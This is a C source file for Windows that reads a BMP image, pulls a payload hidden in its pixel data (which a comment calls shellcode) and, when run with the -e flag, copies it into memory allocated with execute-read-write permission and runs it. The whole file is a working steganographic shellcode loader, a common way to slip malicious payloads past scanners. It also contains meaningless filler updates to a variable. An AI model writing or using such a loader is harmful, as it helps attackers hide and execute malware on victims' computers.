#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <windows.h>


#include "src/utils.h"
#include "src/structs.h"
#include "src/steg.h"

int main(int argc, char *argv[]) {
    bitmap_header head;
    dib_header dbhead;
    FILE *bitmap_file;
    int vs = 2;
    int e = 0;

    char *bitmap_fname = "out.bmp";
    for (int i = 0; i < argc; i++) {
        if (strcmp("-b",argv[i]) == 0) { // bitmap source
            bitmap_fname = argv[i+1];
        }
        if (strcmp("-e",argv[i]) == 0) { // bitmap source
            e = 1;
        }
    }

     
    bitmap_file = fopen(bitmap_fname,"rb");
     if (bitmap_file == NULL) {
          printf("Error: Could not open %s.\n", bitmap_fname);
          return 0;
     }
    
    vs+=(6*9);

     fread(&head,    sizeof(bitmap_header), 1, bitmap_file);
     fread(&dbhead,  sizeof(dib_header), 1, bitmap_file);

     if (head.magic[0] != 0x42 || head.magic[1] != 0x4d) {
          printf("Error: %s Not a bmp file.\n", bitmap_fname);
          fclose(bitmap_file);
          return 0;
     }
     // may be optimized. it dont need to be done for all cases, like 'describe'.
     uint32_t size = ((dbhead.w_pixels * dbhead.h_pixels) * (dbhead.bits_pixel/(uint32_t)8));
     uint8_t *data = (uint8_t *)malloc(size);
     fread(data,  size, 1, bitmap_file);
     fclose(bitmap_file);
    vs = size - 6;
    if (test_for_saved(data, size, 1) == 1) {
        /*
            This function will return the shellcode to "volume",
            You may do anything with this data.
        */
        uint8_t *volume = read_from_byte_array(data, size);
        uint32_t volume_size = get_hidden_data_size(data, size);
        printf("%db: ",volume_size);
        /*for (int i = 0; i<volume_size; i++) {
            printf("%x", volume[i]);
        }*/
        printf("\n");

        if (e != 0) {
            void *exec = VirtualAlloc(0, volume_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

            /*int x = 1;
            HANDLE hThread = CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)exec,&x, 0,NULL);
            HANDLE Thread_Handles[1];
            Thread_Handles[0] = hThread;
            WaitForMultipleObjects( 1, Thread_Handles, TRUE, INFINITE);
            CloseHandle(hThread);*/

	        memcpy(exec, volume, volume_size-1);
	        ((void(*)())exec)();
        }
        vs = volume_size + 5;
        free(volume);
        return 0;
    }
     
    return 0;
}


